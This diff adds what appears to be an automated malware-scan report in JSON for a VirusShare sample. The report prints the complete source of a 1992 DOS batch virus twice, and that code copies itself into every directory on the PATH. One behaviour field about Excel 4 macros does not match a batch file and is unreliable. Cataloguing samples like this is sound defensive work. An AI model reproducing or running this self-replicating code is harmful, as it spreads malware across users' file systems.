@@ -1,0 +1,61 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off\nrem Virus batch file that copies itself to all the directories\nrem V0.01 Aleksey D. Teterko Tcherkassy 1992\nrem V0.02 - Virus finds its copies\nif \"%1\"==\"+\" goto find\nif not \"%1\"==\"\" goto copy\n break off\nif exist `.bat goto start\nrem Copy batch file to current directory\n call ` + %path%\nrem  Copy batch file from current directory to all others\n:start\n call ` %path%\n break on\ngoto end\nrem Find batch file\n:find\n shift\nif \"%1\"==\"\" goto end\nif not exist %1\\`.bat goto find\n copy %1\\`.bat `.bat >nul\ngoto end\nrem Copy batch file\n:copy\n copy `.bat %1 >nul\n shift\nif not \"%1\"==\"\" goto copy\n:end"
+    },
+    "filename": "VirusShare_46e1af20d55a718a073d11838413db85",
+    "filesize": 629,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "46e1af20d55a718a073d11838413db85",
+        "sha1": "7f4542844d815199895281cbfc6490f2a891507d",
+        "sha256": "ae33ab6afa7d0579a705cd58ff0fd7557ecfbcbff674a7237d1855a736a4bf94"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "rem Virus batch file that copies itself to all the directories",
+            "rem V0.01 Aleksey D. Teterko Tcherkassy 1992",
+            "rem V0.02 - Virus finds its copies",
+            "if \"%1\"==\"+\" goto find",
+            "if not \"%1\"==\"\" goto copy",
+            " break off",
+            "if exist `.bat goto start",
+            "rem Copy batch file to current directory",
+            " call ` + %path%",
+            "rem  Copy batch file from current directory to all others",
+            ":start",
+            " call ` %path%",
+            " break on",
+            "goto end",
+            "rem Find batch file",
+            ":find",
+            " shift",
+            "if \"%1\"==\"\" goto end",
+            "if not exist %1\\`.bat goto find",
+            " copy %1\\`.bat `.bat >nul",
+            "goto end",
+            "rem Copy batch file",
+            ":copy",
+            " copy `.bat %1 >nul",
+            " shift",
+            "if not \"%1\"==\"\" goto copy",
+            ":end"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.345386",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
